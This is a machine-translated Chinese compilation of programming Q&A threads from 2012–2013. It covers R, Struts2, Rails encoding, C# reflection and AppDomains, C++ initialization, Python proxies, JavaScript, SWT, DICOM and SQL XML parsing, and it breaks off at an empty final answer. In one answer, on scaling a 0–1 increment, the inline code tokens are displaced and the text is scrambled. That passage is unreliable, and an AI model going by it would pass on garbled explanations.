我有一个包含 3 个对象（A、B、C）的数据框，这些对象具有以下关系分数：

```
relationships<-data.frame(object.1=c("A","A","B"),object.2=c("B","C","C"),relationship=1:3)

relationships

  object.1 object.2 relationship
1        A        B            1
2        A        C            2
3        B        C            3 
```

考虑 A、B、C 的所有可能排列以及相邻对象之间的关系分数，即

```
A   1   B   3   C   = 4
A   2   C   3   B   = 5
C   2   A   1   B   = 3
B   1   A   2   C   = 3
B   3   C   2   A   = 5
C   3   B   1   A   = 4 
```

我需要确定对对象进行排序的对象的顺序，以便相邻对象的关系从左到右尽可能高，即对于上面的示例，我将选择

```
B   3   C   2   A   = 5 
```

有什么建议我应该怎么做？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T04:16:40.527

这是否接近您正在寻找的内容？

```
library(data.table)
relationships<-data.table(object.1=c("A","A","B"),object.2=c("B","C","C"),relationship=1:3)
relationships<-rbindlist(list(relationships,relationships[,list(object.1=object.2, object.2=object.1, relationship)]))
setkey(relationships,object.1,object.2)

perm<-CJ(C1=LETTERS[1:3],C2=LETTERS[1:3],C3=LETTERS[1:3])[!C1==C2 & !C1==C3 & !C2==C3]
setkey(perm,C1,C2)
perm[relationships,rel.1:=relationship]
setkey(perm,C2,C3)
perm[relationships,rel.2:=relationship]
perm[order(-rel.1,-rel.2)] 
```

它不是很可扩展，但也许可以扩展......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:52:21.540

它似乎是图形问题中的最短路径（即最长，但这没关系） - 尝试使用`igraph`将您的输入视为真实图形，然后用于`shortest.paths`找到最佳连接，最后选择实现您的递减关系的这个最佳标准。（这是次优解决方案，但最佳解决方案可能需要用 C 或类似的东西编写）。

# java - 将消息传递给jsp（struts2）

> ID：12460111
> 
> 赞同：0
> 
> 时间：2012-09-17T13:21:04.093
> 
> 标签：java, jsp, struts2

我需要执行以下操作：一旦用户单击按钮，它应该触发一个动作，一旦动作完成，它应该向 jsp 页面发送正确的消息以显示给用户，我正在使用以下代码但没有任何想法如何完成它。

```
 <sj:a id="Submit" href="%{ajaxText}" targets="div1">Add</sj:a>
   <s:url id="ajaxText" value="/myAction.action"/> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:58:16.013

这很容易：

JSP：

```
<s:url id="ajaxText" value="/myAction.action"/>
<sj:a id="Submit" href="%{ajaxText}" targets="div1">Add</sj:a>
<s:actionmessage /> 
```

动作类：

```
public String execute() throws Exception {
    addActionMessage("your message");
    return Action.SUCCESS;
} 
```

配置：

```
<action name="myAction" class="">
    <result name="success">path/to/your.jsp</result>
</action> 
```

该消息将被显示。

# ruby-on-rails - 奇怪的 ActionView::Template::Error in production, 500 internal server error

> ID：12460113
> 
> 赞同：0
> 
> 时间：2012-09-17T13:21:11.230
> 
> 标签：ruby-on-rails

当我尝试在我的测试生产服务器上加载我网站的某些页面（实际上是大多数页面）时，我遇到了一条奇怪的错误消息。

```
Started GET "/students" for 10.0.0.68 at Mon Sep 17 12:53:16 +0100 2012
Processing by StudentsController#index as HTML
  Rendered shared/_alerts.html.erb (0.7ms) 
  Rendered students/_student_search.html.erb (0.0ms)
  Rendered students/index.html.erb within layouts/application (17.8ms)
Completed 500 Internal Server Error in 92ms

ActionView::Template::Error (syntax error on line 4, col 586: `      state: ["北海道","青森県","岩手県","宮城県","秋田県","山形県","福島県","茨城県","栃木県","群馬県","埼玉県","千葉県","東京都","神奈川県","新潟県","富山県","石川県","福井県","山梨県","長野県","岐阜県","静岡県","愛知県","三重県","滋賀県","京都府","大阪府","兵庫県","奈良県","和歌山県","鳥取県","島根県","岡山県","広島県","山口県","徳島県","香川県","愛媛県","高知県","福岡県","佐賀県","長崎県","熊本県","大分県","宮崎県","鹿児島県","沖縄県"]'):
    59:     <% end %>
    60:     
    61:     <div class="sidebar_item">
    62:       <h2>Filter By <%= t(:class) %></h2>
    63:       <div class="content">
    64:         
    65:         <% if Klass.where(:tutor_group => false).count > 0 %>
  app/views/students/index.html.erb:62:in `_app_views_students_index_html_erb___542210558__648905548'
  app/views/students/index.html.erb:35:in `_app_views_students_index_html_erb___542210558__648905548' 
```

无论出现在错误消息上的哪个页面总是相同的（相同的行号和列号），但文件名不同，引用的代码也发生了变化。据我所知或可以看到，我的代码中没有这些日文字符。这似乎是一些编码问题或其他东西，但我真的不知道，我不知道从哪里开始调试它。

我的环境：

```
deploy@mike-test:~$ ruby -v
ruby 1.8.7 (2010-08-16 patchlevel 302) [i686-linux]
deploy@mike-test:~$ rails -v
Rails 3.2.0
deploy@mike-test:~$ gem -v
1.8.15
deploy@mike-test:~$ /opt/nginx/sbin/nginx -V
nginx version: nginx/1.2.3
built by gcc 4.5.2 (Ubuntu/Linaro 4.5.2-8ubuntu4) 
TLS SNI support enabled
configure arguments: --prefix=/opt/nginx --with-http_ssl_module --with-http_gzip_static_module --with-cc-opt=-Wno-error --with-pcre=/tmp/root-passenger-16778/pcre-8.31 --add-module=/usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.17/ext/nginx
deploy@mike-test:~$ passenger -v
Phusion Passenger version 3.0.17 
```

Ubuntu 是 11.04。

**更新：**好的，我缩小了问题的范围。发现它与方法调用 t(:class) 有关，它是一种用于翻译的 rails 辅助方法，并且在我的视图中出现了很多（我是这个应用程序的新手，所以我仍然对它是如何理解的书面）。从存在的两个语言环境文件来看，这意味着根据语言环境设置返回“学校”或“班级”。不过，我仍然不知道为什么会导致此错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T11:22:03.853

@Hates_ 在评论中为我解决了这个问题，所以我会复制他放在这里的内容，以便我可以接受它作为答案：

> 这个问题的答案 [heroku run db:migrate fail as rake aborted](https://stackoverflow.com/questions/12449977/heroku-run-dbmigrate-fail-as-rake-aborted) 应该有帮助：[https ://stackoverflow.com/a/12451678](https://stackoverflow.com/a/12451678)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:39:42.947

似乎您需要处理正确的字符编码。以下是一些关于使用UTF-8`force_encoding`或`encoding`转为 UTF-8 的快速发现。

*   [在 rails 3.0.1 中渲染 json 但编码的字符](https://stackoverflow.com/questions/11075308/rendering-json-but-encoded-characters-in-rails-3-0-1)。
*   [由于 cookie 的 8 位编码（Rails 3 和 Ruby 1.9）导致错误“不兼容的字符编码：ASCII-8BIT 和 UTF-8”](https://stackoverflow.com/questions/5398889/error-incompatible-character-encodings-ascii-8bit-and-utf-8-due-to-8-bit-enco)

# c# - 我应该考虑反射

> ID：12460118
> 
> 赞同：0
> 
> 时间：2012-09-17T13:21:24.097
> 
> 标签：c#

我不太确定，什么时候应该考虑不使用反射。目前，我在以下情况下苦苦挣扎：

两个类之间的映射是通过反射完成的（使用字典到属性）。在一个类中，我们有一个`dictionary<string, object>`，而在另一个类中，我们有与字典键同名的属性。然后我起诉反射来获取属性并设置它。

你看，所有的对象也有昂贵的铸件。有时我必须进行自定义转换，因为类型不同..

反射的唯一大优势是“简单”的映射，只有几行和更少的类。反射和正常的属性设置方法都是可能的。

> **注意**：我的问题更多是从设计的角度来看，而不是“如何”解决问题。

如果您能给我一些建议，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:53:43.023

> 我的问题更多是从设计的角度，而不是`how to`解决问题

要回答您的问题，通常您会使用反射来进行这样的动态属性映射。但是，在实践中，反射可能很重且很慢（正如您开始注意到的那样）。正如您可能已经猜到的那样，这个问题很常见，并且已经有一些库可以为您完成所有繁重的工作，例如[AutoMapper](https://github.com/AutoMapper/AutoMapper)。

就将a 映射`Dictionary`到对象而言，我从未将 AutoMapper 用于类似的事情，因此我无法评论它是否支持它（我猜它可能可以，它非常灵活）。如果您`Dictionary`只是自定义映射的桥梁，那么如果您确实切换到使用，则`AutoMapper`可以完全摆脱它。

# linux - 使用 IP_HDRINCL 选项时在 Linux 上面临路由 (RPDB) 问题

> ID：12460119
> 
> 赞同：3
> 
> 时间：2012-09-17T13:21:32.370
> 
> 标签：linux, sockets, routing

我一直在使用 Linux (2.6.x) RPDB（路由策略数据库）来实现基于源地址的路由，为所需的源设置专用路由表，如下所示：

1.  0：从所有本地查找
2.  32765：来自源 IP 地址查找表 ID
3.  32766：来自所有查找主
4.  32767：从所有查找默认值

此外，我的应用程序使用原始套接字来生成 ICMP 回显消息。问题在于，当“IP_HDRINCL”套接字选项设置为“1”并且应用程序将整个 IP 标头与源 IP 地址一起构建时，相应的路由表不会被命中，而是会命中主路由表。

但是，如果我修改应用程序不设置 IP_HDRINCL 套接字选项并显式绑定原始套接字以指定源地址，那么它会正确命中所需的路由表。

是否需要绑定一个套接字才能使用 RPDB 的基于源的路由功能？

提前致谢！！

# c# - 为什么组装仍然可见？

> ID：12460133
> 
> 赞同：0
> 
> 时间：2012-09-17T13:22:09.160
> 
> 标签：c#, .net

> **可能重复：**
> [卸载使用 Assembly.LoadFrom() 加载的程序集](https://stackoverflow.com/questions/6258160/unloading-the-assembly-loaded-with-assembly-loadfrom)

我使用自定义`AppDomain`加载/卸载程序集。但是当卸载程序集时，我可以在`AppDomain.CurrentDomain`.

怎么可能？这是正常行为还是我遗漏了什么？

谢谢你的任何线索！

```
 string assemblyPath = @"C:\MyFile.dll";
 var assemblyName = AssemblyName.GetAssemblyName(assemblyPath);

            var ads = new AppDomainSetup
                          {
                              ApplicationBase = AppDomain.CurrentDomain.SetupInformation.ApplicationBase, 
                              DisallowCodeDownload = true 
                          };

            AppDomain newDomainName = AppDomain.CreateDomain("newDomainName", null, ads);
              try
              {
                  Assembly testLibrary = newDomainName.Load(assemblyName);

                  var c1 = AppDomain.CurrentDomain.GetAssemblies();

                  var c2 = newDomainName.GetAssemblies();
              }
              finally
              {
                  AppDomain.Unload(newDomainName);

                  var c3 = AppDomain.CurrentDomain.GetAssemblies();

                  // The assembly is still visible here!!!
              } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T13:30:12.330

您正在调用`Load()`AppDomain 的方法，根据[文档](http://msdn.microsoft.com/en-us/library/8wcywcds%28v=vs.100%29.aspx)：“应仅用于将程序集加载到当前应用程序域中。提供此方法是为了方便无法调用静态 Assembly.Load 方法的互操作性调用者。要将程序集加载到其他应用程序域，请使用 CreateInstanceAndUnwrap 等方法。”

换句话说，您正在将程序集加载到主 AppDomain 中，因为您是`Load()` *从*主 AppDomain 调用的（即使您正在使用在辅助 AppDomain 的实例上调用它），这就是它甚至在之后出现的原因您卸载辅助 AppDomain。

如上述文档的摘录所示，您可能想要使用[AppDomain.CreateInstanceAndUnwrap](http://msdn.microsoft.com/en-us/library/3c4f1xde%28v=vs.100%29.aspx)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:25:51.717

您不能从应用程序域中删除已加载的程序集。

[http://blogs.msdn.com/b/jasonz/archive/2004/05/31/145105.aspx](http://blogs.msdn.com/b/jasonz/archive/2004/05/31/145105.aspx)

[http://msdn.microsoft.com/en-us/library/ms173101(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/ms173101(v=vs.80).aspx)

> 如果不卸载包含它的所有应用程序域，就无法卸载单个程序集。即使程序集超出范围，实际的程序集文件仍将保持加载，直到包含它的所有应用程序域都被卸载。

[http://blogs.msdn.com/b/suzcook/archive/2003/07/08/unloading-an-assembly.aspx](http://blogs.msdn.com/b/suzcook/archive/2003/07/08/unloading-an-assembly.aspx)

> 如果不卸载包含它的所有应用程序域，就无法卸载单个程序集。

# c++ - C++，获取指针 0xcdcdcdcd 从另一个类创建一个公共类

> ID：12460135
> 
> 赞同：-2
> 
> 时间：2012-09-17T13:22:11.910
> 
> 标签：c++, pointers

我明白了：

![图片](../Images/8f14ffad0a60efaad0e9b35b7d21cb46.png)

这是两个类的示例代码：

主文件

```
class CControl
{
protected:
    int m_X;
    int m_Y;

public:
    void SetX( int X ) { m_X = X; }
    void SetY( int Y ) { m_Y = Y; }

    int GetX() { return m_X; }
    int GetY() { return m_Y; }

    CControl *m_ChildControls;
    CControl *m_NextSibling;
    CControl *m_PreviousSibling;
    CControl *m_Parent;
    CControl *m_FocusControl;
};

class CButton : public CControl
{
protected:
    bool m_Type;
    bool m_Selected;
    bool m_Focused;
public:
    CButton( bool Type );
    ~CButton();
};

CButton::CButton( bool Type )
{
} 
```

这只是两个类的声明（它们不完整，但问题也出现在完整编码版本中）。

主文件

```
#include <windows.h>
#include "main.h"

int main()
{
    CButton *g_Button;
    g_Button = new CButton( 1 );

    return 0;
} 
```

这只是我将 g_Button 声明为新的 CButton 对象以进行调试分析的应用程序主函数。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:26:18.633

你指的是`CControl *`成员吗？由于您没有在构造函数中初始化它们，因此它们处于某个“随机”值是正常的；特别是，您看到的值是在 VC++ 中的调试构建中使用的模式，用于标记未初始化的内存。

你类的其他字段也是如此（-842150451 是 32 位有符号整数解释`0xcdcdcdcd`）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:25:24.560

指针可以是任何东西，因为它们没有被初始化。

编译器生成的默认构造函数`CControl`不会初始化 POD 成员。你需要自己写：

```
CControl() : m_ChildControls(NULL),  m_NextSibling(NULL), m_PreviousSibling(NULL)
             m_Parent(NULL), m_FocusControl(NULL)
{
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T13:25:12.757

您需要在构造函数中初始化类的数据成员。

```
CButton::CButton( bool Type )
{
    m_Type = Type;
    m_X = m_Y = 0;
    m_ChildControls = NULL;
    // ...
} 
```

# c# - 在可变距离上递增 0-1 保持时间相等

> ID：12460137
> 
> 赞同：-1
> 
> 时间：2012-09-17T13:22:20.147
> 
> 标签：c#, math, distance, increment

我无法思考这个问题，我认为这是答案非常简单但我离问题太近而看不到解决方案的时刻之一。

我有一个可变的距离和一个无论长度如何都必须同时穿过这个距离的对象。

距离的起点为 0，距离的终点为 1。

显然，保持时间相等的长度越大，增量就越小。

我可以使用什么公式来计算 0-1 增量，但保持所用时间相等。

我知道增加的方式似乎过于复杂，但它是我获得的第三方插件的一部分。

我正在用 C# 编码。

谢谢。

[编辑]对不起，我不是很清楚。对于增量，起点始终为 0，终点始终为 1。例如，对象可以移动 += 0.5。因此，当长度从 30 增加到 65 时，从 0 增加到 1 需要更长的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:27:25.420

因此，您正在寻找一种在 [ , ] 范围内有一个数字的方法，该数字`x`映射到某个任意范围 [ `0`, ] 中的某个数字，并且正在寻找增量值 a 使得 if -> then + -> +对于某个常数? 如果我正确理解了您的问题，那么您的价值应该是：`1``y``min``max``x``y``x``a``y``b``b``a`

`a = b / (max - min)`注意：确保为 C# 正确格式化，特别是确保强制转换之类的东西。

这基本上是说`a`应该是`a`跨越的范围的分数，如果是从to`b`范围的一半，那么应该是 0.5，如果跨越范围的五分之一，应该是 0.2。`min``max``a``b``a`

# python - 如果 URL 是 https，Python urllib2 给出“网络无法访问错误”

> ID：12460139
> 
> 赞同：3
> 
> 时间：2012-09-17T13:22:21.523
> 
> 标签：python, http, ssl, https, urllib2

我正在尝试使用 urllib2 库获取一些 url。

```
a = urllib2.urlopen("http://www.google.com")
ret = a.read() 
```

上面的代码工作正常，并给出了预期的结果。但是当我将网址设为 https 时，它会出现“网络无法访问”错误

```
a = urllib2.urlopen("https://www.google.com")
urllib2.URLError: <urlopen error [Errno 101] Network is unreachable> 
```

ssl有问题吗？我的python版本是Python2.6.5。我也在学术代理服务器后面。我在 bash 文件中有设置。无论如何，由于 http 正在打开代理，这里不应该是问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:46:05.473

通常这种情况下的问题是您背后的代理拥有过期或不受信任的 SSL 证书。就 SSL 而言，urllib 比大多数浏览器更麻烦，这就是您可能会收到此错误的原因。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T15:11:44.023

http url 没有给出错误，因为已经设置了 http_proxy 变量。通过设置 https_proxy，上述错误消失。

```
export http_proxy = "http://{proxy-address}" 
```

为 https_proxy 设置相同的东西

```
export https_proxy = "http://{proxy-address}" 
```

# javascript - Javascript水平滚动画廊，在IE9中无法使用scrollLeft并以chrome停止

> ID：12460144
> 
> 赞同：1
> 
> 时间：2012-09-17T13:22:30.560
> 
> 标签：javascript, google-chrome, internet-explorer-9, settimeout, image-gallery

我的水平滚动图片库有一些问题。要滚动它，我使用 javascript scrollLeft 方法并使用计时器 (setTimeout) 调用该函数。到达滚动条的末尾后，我将其设置为开头。

它在单核 AMD Athlon 64 3000+ 上运行良好。(windows xp FF15 & IE8) 它也可以在一台运行速度为 600 兆赫的奔腾 m 的旧笔记本电脑上工作。(windows xp FF15) 在我的四核上它像冰淇淋一样光滑，但在我老板的高端机器上它是波涛汹涌和缓慢的。（因此这是开发人员的错：D，我必须修复它。） - 但是如何？在 Intel T1300 上它也可能会更快一些（多么糟糕的 CPU）

我想我的老板装备有一些遗漏，但我会很感激提示如何使我的脚本通常更快。

但还有一些额外的奇怪之处：它适用于 Firefox 14 和 15 以及 IE8。但是 IE9 的滚动速度非常慢，无法使用。而对于 Chrome，它不会在 onmouseover 事件之后恢复，这会暂停画廊。Onmouseout 没有被触发，因为 chrome 无法识别它？

我在这里做了一个小提琴：http: [//jsfiddle.net/cQf44/7/](http://jsfiddle.net/cQf44/7/) （在原始代码中，图像另外嵌套在一个DIV中，我可能会改变）

这是我为这个问题做的例子。

```
 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title></title>
            <style type="text/css">
        html
    {
        height:100%;
    }

    body
    {
        height:98%;
        background-color: #FFF9E5;    
        padding: 0px;                                
    }   

#wrapper
{
    margin:auto;
    padding: 0;
}
#outer
{
    padding: 0;
    background-color: #FFF9E5;
}

#container
{
    margin: 0 auto;   
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    width:60%;
    background-color: #867F27;
    padding-right:1%;
    padding-left:1%;
}

#view
{   
    height: 180px;
    white-space: nowrap;
    line-height: 0;
    overflow-x: auto;
    margin: 0 auto;
    vertical-align: middle;
    width:800px;    /*with a fixed width it works very nice*/
    max-width: 75%; /*lets the gallery shrink on resize of the browser*/
}    

img
{
        display: inline-block;
}
    </style>
</head>
<body>
    <div id="wrapper">
        <div id="outer">
            <div id="container">
                <div id="view" onmouseover="javascript:stop_scroll()" onmouseleave="javascript:start_scroll()">
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                    <img src="http://lorempixel.com/205/154/"/>
                </div>
            </div>
        </div>
    </div>
<script type="text/javascript">
var gallery = document.getElementById('view');
var scroll_timer;

autoscroll();
function autoscroll()
{
    scroll_timer=setTimeout("autoscroll()",10);    
    var max_scroll = parseInt(gallery.scrollWidth)-parseInt(gallery.clientWidth);
    gallery.scrollLeft += 1;
    if(gallery.scrollLeft == max_scroll)
    {
        gallery.scrollLeft = 0;
    }
}

function stop_scroll()
{
    clearTimeout(scroll_timer);
}

function start_scroll()
{
    scroll_timer=setTimeout("autoscroll()",10);
}

</script>
</body>
</html> 
```

一如既往地提前感谢，祝你有美好的一天。

# asp.net-mvc - DropDownListFor EF5 中的枚举

> ID：12460152
> 
> 赞同：12
> 
> 时间：2012-09-17T13:22:54.117
> 
> 标签：asp.net-mvc, entity-framework, razor

使用 MVC4 Razor 和 Entityframework 5。我有一个名为组织的表，其中包含一个整数 TypeID 字段，我创建了一个枚举类型。在代码中，我可以使用枚举设置和比较 typeid。

```
 public enum OrganisationType : int
    {
        Company = 1,
        Department = 2,
        Location = 4
    } 
```

但是，当我使用默认的 vs2012 mvc 4 razor 模板或通过 mvcscaffolding nuget 包生成 create.cshtml 时，都会忽略 TypeID 字段。我正在考虑修改 tt 模板，以便它们自动生成。但最初是否可以在下拉列表中显示枚举的描述性名称。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-09-17T13:54:36.940

这就是解决方案，遗憾的是修改 TT 模板以使其自动化并不简单。

```
@Html.DropDownListFor(model => model.TypeID, new SelectList(Enum.GetValues(typeof(Models.OrganisationType)))) 
```

这将显示一个下拉组合，其中包含文本值，即公司、部门、位置。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-09-12T22:36:18.703

在当前版本的 MVC5 中，如果您为具有枚举的模型构建视图，它将生成以下内容：

```
@Html.EnumDropDownListFor(model => model.OrganisationType,
                          htmlAttributes: new { @class = "form-control" }) 
```

这与 Tim 的解决方案完全相同，但语法稍好一些。

# java - ScrolledComposite 不在 SashForm 内滚动

> ID：12460153
> 
> 赞同：0
> 
> 时间：2012-09-17T13:22:56.953
> 
> 标签：java, layout, swt

我有以下 SWT 布局：

*   选项卡项
    *   窗扇
        *   复合（网格布局）
            *   标签（填充 W，抓取 H）
            *   ScrolledComposite（填充 W/H，抓取 H/V）
                *   复合（行布局）
        *   复合（网格布局）
            *   标签（填充 W，抓取 H）
            *   ScrolledComosite（填充 W/H，抓取 H/V）
                *   复合（行布局）

总体思路是，两个相同的窗格并排并排，通过窗扇可调节宽度，每个窗格内部顶部有一个标签，底部有一个滚动组合。滚动的复合材料将有许多 (1 - 50) 个 100x100 复合材料包含在包裹的复合材料中。

问题是，当包含在窗扇表单中时，当内部组合由于大量子项而增长时，滚动组合将不会滚动。当我放弃 SashForm 并使用常规 Composite 时，我没有遇到这个问题，如下所示：

*   选项卡项
    *   复合（网格布局）
        *   标签
        *   滚动复合
            *   合成的
        *   标签
        *   滚动复合
            *   合成的

这样就没有多余的复合容器，一切都在网格布局中。唯一的问题是我无法通过通用界面（窗扇）调整窗格的宽度。

* * *

我尝试使用 强制布局`layout()`，并使用`setMinSize()`. 我尝试用 FlowLayout (swing2swt) 交换 RowLayout。我假设这是一种布局问题，但我没有足够的 SWT 经验来解决它。除了滚动问题之外，布局是完美的。

## 源示例

所有代码都是由 WindowBuilder Pro 自动生成的，并且可以通过构建我指定的复合树来复制。这是我用来填充包装复合材料的片段：

```
public void populate(Composite composite, List<Photo> items) {
   composite.setRedraw(false);
   for (Photo photo : photos) {
     PhotoComposite composite = new PhotoComposite(composite, photo, SWT.NONE);
     composite.setSize(100, 100);
   }
   composite.setRedraw(true);
   composite.layout(true);
} 
```

Photo 是一个简单的 POJO，而 PhotoComposite 是一个自定义组合，除了传统的 Composite 和 style 位之外，它在构造函数中将 Photo 作为参数。根据我的实验，此代码似乎可以正常工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:51:29.313

事实证明，问题是对`setMinSize(int, int)`. 对上面显示的填充方法的以下更改为我解决了这个问题：

```
public void populate(ScrolledComposite scroll, Composite composite, List<Photo> items) {
   composite.setRedraw(false);
   for (Photo photo : photos) {
     PhotoComposite composite = new PhotoComposite(composite, photo, SWT.NONE);
     composite.setSize(100, 100);
   }
   composite.setRedraw(true);
   composite.layout(true);

   scroll.setMinSize(composite.computeSize(scroll.getSize().x, SWT.DEFAULT));
} 
```

# dicom - 读取 DICOM 1.2.840.10008.1.2.4.70

> ID：12460154
> 
> 赞同：1
> 
> 时间：2012-09-17T13:22:59.880
> 
> 标签：dicom, medical, lossless

读取 DICOM 文件时出现问题。这是格式 1.2.840.10008.1.2.4.70（具有一阶预测的过程 14（选择值 1）。我编写自己的软件。

这是我工作的结果。

![点击](../Images/eee532eac1a2ee0023ead2073809177d.png)

我还给你一个[.dcm 文件](https://docs.google.com/open?id=0Bw5-VXnqutXBam93ZDFyUG15Z2s)。

它有什么问题？只有 RadiAnt Dicom Viewer 可以正确打开它（我没有找到任何带有源代码的工作软件）。有人有关于它的教程吗？任何工作代码？

我将不胜感激！感谢帮助。

* * *

我告诉你我是怎么做的：

```
//I have:
numCOL= imageWidth;
numROW= imageHeight;

dwCurrentBufferLength;//-> where I in file

//and other stuff...

//First i decode first row:
//[0][0]

DecodeFirstRow(curRowBuf,dwCurrentBufferLength);

//I calculate difrences
HuffDecode ( table , &val, dwCurrentBufferLength);

//and extend
HuffExtend(extend, val);

curRowBuf[0][curComp]=extend+(1<<(Pr-Pt-1));

//[1-n][0]
//... huff stuff
curRowBuf[col][curComp]=extend+curRowBuf[col-1][curComp];

//Then i put row to the vector:
for (col = 0; col < numCol; col++) 
{       
v=RowBuf[col][0]<<point_transform_parameter;                    
m_vOutputBuf.push_back(v);
}   

//Rest of columns
//[0][m]
curRowBuf[0][curComp]=extend+prevRowBuf[0][curComp];    

predictor = left =curRowBuf[leftcol][curComp];
//[1-n][m]
curRowBuf[col][curComp]=extend+predictor;
//and also put it to vector ^^ 
```

我必须在哪里分这 1000？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:19:09.160

很可能您在计算 HU 值时没有考虑*Rescale Intercept*，标记 (0028,1052)。根据 DICOM 文件，截距为 -1000。

要获得图像的适当 HU 值，请使用以下公式：

```
HU = rescale_slope * pixel_value + rescale_intercept 
```

其中*Rescale Intercept*因此从标签 (0028,1052) 和*Rescale Slope*从标签 (0028,1053) 获得。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-20T16:30:07.860

这是我使用 gdcmviewer 看到的：

$ gdcmviewer 3DSlice1.dcm

![在此处输入图像描述](../Images/a474e926deb7b6b710a5f5c714340d12.png)

[GDCM](http://gdcm.sf.net)是开源的，你可以学习它。

# wpf - 在 MSSQL 中解析 XML 需要很长时间

> ID：12460156
> 
> 赞同：1
> 
> 时间：2012-09-17T13:23:04.747
> 
> 标签：wpf, sql-server, xbap

我有一个很大的 xml 流，我传递给一个存储过程，但是我在 xml 的特定部分得到了将近 1.30 分钟的长响应时间，并且重复了很多。

我检查了执行计划，xml 结构的两个部分几乎占用了所有的处理时间。在进行插入之前，我还尝试先将其读入 2 个临时表，但这并没有帮助。XML 的大小为 368Kb，所以我强烈怀疑我的 xml 要么不稳定，要么我缺少一些有助于简化解析的东西。

有没有更好的方法来制定 xml，让 Xpath() 更容易解析？我真的不知道还能做什么。

xml的结构是：

```
<root>
<someobject>
 <param1></param1>
 <param1></param1>
</someobject>
<somethingelse>
 <param1></param1>
 <param1></param1>
</somethingelse>
<row1>
  <param1></param1>
  <param1></param1>
  <param1></param1>
  <param1></param1>
  <param1></param1>
  <param1></param1>
  <param1></param1>
  <param1></param1>
</row1> 
```

我目前使用的查询：

```
Insert Into [Table] 
Select   
  XmlParam.Doc.value('fieldA[1]','UNIQUEIDENTIFIER')
,XmlParam.Doc.value('fieldB[1]','UNIQUEIDENTIFIER')
,XmlParam.Doc.value('fieldC[1]','UNIQUEIDENTIFIER')
,XmlParam.Doc.value('fieldD[1]','UNIQUEIDENTIFIER')
,XmlParam.Doc.value('fieldE[1]','UNIQUEIDENTIFIER')
,XmlParam.Doc.value('fieldF[1]','UNIQUEIDENTIFIER')
,XmlParam.Doc.value('fieldG[1]','bit')
,XmlParam.Doc.value('fieldH[1]','bit')
      From @Xml.nodes('//Flow/StepData') XmlParam(Doc) 
```

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:46:47.830

试试这个，它可能对你来说更快。

```
Select   
   XmlParam.Doc.value('(fieldA/text())[1]','UNIQUEIDENTIFIER')
  ,XmlParam.Doc.value('(fieldB/text())[1]','UNIQUEIDENTIFIER')
  ,XmlParam.Doc.value('(fieldC/text())[1]','UNIQUEIDENTIFIER')
  ,XmlParam.Doc.value('(fieldD/text())[1]','UNIQUEIDENTIFIER')
  ,XmlParam.Doc.value('(fieldE/text())[1]','UNIQUEIDENTIFIER')
  ,XmlParam.Doc.value('(fieldF/text())[1]','UNIQUEIDENTIFIER')
  ,XmlParam.Doc.value('(fieldG/text())[1]','bit')
  ,XmlParam.Doc.value('(fieldH/text())[1]','bit')
From @Xml.nodes('//Flow/StepData') XmlParam(Doc) 
```

# codeigniter - 我是否正确理解了 Codeingiter 目录结构？

> ID：12460159
> 
> 赞同：0
> 
> 时间：2012-09-17T13:23:06.567
> 
> 标签：codeigniter

这就是我如何理解 Codeigniter 目录结构来操作的。我正在使用 Codeigniter 2.1.2。我是否误解了每个目录的用途？有什么我忘记了吗？

```
-+ /application/
 |
 |-+ /cache/        Used for caching pages if it is enabled
 |-+ /config/       Contains the configuration files for this project
 |-+ /controllers/  All of your controllers are saved here
 |-+ /core/         Used for modifying the core Codeigniter classes
 |-+ /errors/       Handles your errors and their output
 |-+ /helpers/      Contains your own functions
 |-+ /hooks/        Used for running code at the certain points in the routing process
 |-+ /language/     Occasionally used for translating parts of your project into different languages
 |-+ /libraries/    Contains your own classes
 |-+ /logs/         When you log any sort of notice it is saved inside a file in here
 |-+ /models/       All of your models are saved here
 |-+ /third_party/  Basically another name for plugins which go here
 |-+ /views/        Your views are saved here normally organised by controller inside a new directory

-+ system/          Never go in here instead use the core directory inside /application/

-+ index.php        The front controller for your project 
```

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T13:26:14.703

